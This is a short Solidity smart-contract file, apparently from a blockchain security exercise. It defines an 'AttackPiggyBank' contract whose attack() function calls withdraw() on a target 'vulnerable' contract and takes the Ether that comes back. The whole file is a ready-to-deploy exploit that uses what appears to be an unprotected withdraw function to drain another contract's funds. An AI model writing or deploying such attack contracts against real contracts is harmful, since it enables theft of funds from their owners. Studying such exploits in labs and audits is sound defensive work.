// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackPiggyBank {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    // This function directly calls `withdraw()` from the vulnerable contract
    function attack() external {
        // Function signature of withdraw(): 0x3ccfd60b
        // This is the method ID of: withdraw()
        (bool success, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(success, "Attack failed");
    }

    // Receive any Ether sent back
    receive() external payable {}
}
